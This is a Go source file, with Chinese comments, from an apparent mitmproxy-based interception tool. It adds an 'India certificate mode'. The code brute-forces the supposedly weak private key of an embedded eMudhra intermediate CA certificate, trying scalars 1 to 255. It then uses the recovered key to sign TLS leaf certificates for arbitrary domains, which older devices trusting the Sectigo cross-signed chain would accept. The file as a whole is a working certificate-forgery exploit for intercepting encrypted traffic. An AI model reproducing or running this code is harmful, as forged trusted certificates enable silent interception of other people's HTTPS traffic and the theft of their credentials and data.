package mittgo

// 印度证书模式：eMudhra 中间 CA 私钥生成缺陷（2025-04-30 仪式，d < 256），
// 任何人都能从证书里恢复私钥。这里在启动时穷举恢复，并用它签发域名证书，
// 供仍信任 Sectigo 交叉签名链（AAA Certificate Services）的旧设备使用免 root 抓包。
// 该模式默认关闭，需要用户在证书页显式选择。

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	_ "embed"
	"encoding/pem"
	"errors"
	"fmt"
	"math/big"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/lqqyt2423/go-mitmproxy/cert"
)

//go:embed emudhra/em_dv_tls_ca_g3b_aaa.pem
var indiaIntermediatePEM string

type indiaCA struct {
	issuer *x509.Certificate
	key    *ecdsa.PrivateKey

	mu    sync.Mutex
	cache map[string]*tls.Certificate
}

// NewIndiaCA 构造一个用泄露的 eMudhra 中间证书签发的 CA 实现。
func NewIndiaCA() (cert.CA, error) {
	block, _ := pem.Decode([]byte(indiaIntermediatePEM))
	if block == nil {
		return nil, errors.New("india: intermediate pem not found")
	}
	issuer, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("india: parse intermediate: %w", err)
	}
	pub, ok := issuer.PublicKey.(*ecdsa.PublicKey)
	if !ok || pub.Curve != elliptic.P384() {
		return nil, errors.New("india: intermediate is not P-384")
	}
	key, err := recoverWeakKey(pub)
	if err != nil {
		return nil, err
	}
	return &indiaCA{issuer: issuer, key: key, cache: make(map[string]*tls.Certificate)}, nil
}

// recoverWeakKey 穷举 d = 1..255，找到与公钥匹配的私钥。
func recoverWeakKey(pub *ecdsa.PublicKey) (*ecdsa.PrivateKey, error) {
	curve := elliptic.P384()
	for d := int64(1); d < 256; d++ {
		x, y := curve.ScalarBaseMult(big.NewInt(d).Bytes())
		if x.Cmp(pub.X) == 0 && y.Cmp(pub.Y) == 0 {
			return &ecdsa.PrivateKey{PublicKey: *pub, D: big.NewInt(d)}, nil
		}
	}
	return nil, errors.New("india: private key is not in the weak range")
}

func (ca *indiaCA) GetRootCA() *x509.Certificate { return ca.issuer }

func (ca *indiaCA) GetCert(commonName string) (*tls.Certificate, error) {
	ca.mu.Lock()
	if cached, ok := ca.cache[commonName]; ok {
		ca.mu.Unlock()
		return cached, nil
	}
	ca.mu.Unlock()

	leafKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}
	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 120))
	if err != nil {
		return nil, err
	}
	now := time.Now()
	template := &x509.Certificate{
		SerialNumber:          serial,
		Subject:               pkix.Name{CommonName: commonName},
		NotBefore:             now.Add(-48 * time.Hour),
		NotAfter:              now.Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		SignatureAlgorithm:    x509.ECDSAWithSHA384,
	}
	if ip := net.ParseIP(strings.TrimSpace(commonName)); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{commonName}
	}

	der, err := x509.CreateCertificate(rand.Reader, template, ca.issuer, &leafKey.PublicKey, ca.key)
	if err != nil {
		return nil, fmt.Errorf("india: sign leaf: %w", err)
	}
	out := &tls.Certificate{
		Certificate: [][]byte{der, ca.issuer.Raw},
		PrivateKey:  leafKey,
	}
	ca.mu.Lock()
	ca.cache[commonName] = out
	ca.mu.Unlock()
	return out, nil
}